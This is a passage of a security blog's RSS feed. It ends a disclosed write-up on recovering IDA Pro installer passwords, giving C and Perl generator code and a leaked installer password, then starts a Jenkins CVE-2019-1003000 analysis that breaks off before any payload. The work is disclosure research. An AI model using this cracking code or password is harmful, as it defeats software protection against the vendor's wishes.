&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大約一個月的運算，我們終於成功利用 Perl 亂數產生出 IDA Pro 的安裝密碼，而正確的字元組順序為 &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;。例如 hacking team 洩漏的 IDA Pro 6.8 安裝密碼是 &lt;code class=&quot;highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt;，就可用下面程式碼產生：&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$i $pw\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過這些資訊，我們可以建立一個用來暴力列舉安裝密碼的字典檔，縮短暴力列舉的時間，實作方式可參考 &lt;a href=&quot;https://github.com/kholia/inno2john&quot;&gt;inno2john&lt;/a&gt; 專案。在一般情況下，約十分鐘即可算出 windows 安裝檔的安裝密碼。&lt;/p&gt;

&lt;p&gt;在回報 Hex-Rays 後，他們立刻表示之後將會使用更安全的安裝密碼。&lt;/p&gt;

&lt;h2 id=&quot;總結&quot;&gt;總結&lt;/h2&gt;

&lt;p&gt;本篇文章提出了一個開放性問題：在未知安裝密碼的情況下可不可以安裝 IDA Pro？結果我們在 Linux 以及 MacOS 版發現可以從記憶體中取得明文密碼。而在 Windows 版本中，我們黑箱找到了安裝密碼產生的方式，因此我們可以建立一份字典檔，用以縮短暴力列舉安裝密碼的時間，最終，我們約十分鐘可解出一組密碼，是一個可以接受的時間。&lt;/p&gt;

&lt;p&gt;我們真的很喜歡這樣的過程：有根據的大膽猜測，竭盡全力用任何已知資訊去證明我們的想法，不論猜測是對是錯，都能從過程中獲得很多經驗。這也是為什麼我們這次願意花一個月時間去驗證一個成功機率不是很高的假設。附帶一提，這樣的態度，也被運用在我們&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;上，想要試試嗎 :p&lt;/p&gt;

&lt;p&gt;寫在最後，要感謝 Hex-Rays 很友善且快速的回應。即使這個問題不包含在 &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt; 裡面，仍然慷慨的贈送 Linux 和 MAC 版 IDA 及升級原有 Windows 版至 IDA Pro。再次感謝。&lt;/p&gt;

&lt;h2 id=&quot;時間軸&quot;&gt;時間軸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - 向 Hex-Rays 回報弱點&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays 說明之後會增加安裝密碼的強度，並協助通報 BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock 釋出了 InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing&lt;br /&gt;
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)! Although we could bypass the first ACL, we still can’t do much things :(&lt;/p&gt;

&lt;p&gt;After Jenkins released the &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;First, we start from the Jenkins Pipeline to explain &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt;! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)&lt;/p&gt;

&lt;p&gt;In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it’s too tough. So the easiest way is to reuse existing function and library!&lt;/p&gt;

&lt;p&gt;As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here Jenkins validates the Pipeline with the method &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(…)&lt;/a&gt;! It should be noted that this is just an AST parsing. Without running &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(&lt;/p&gt;

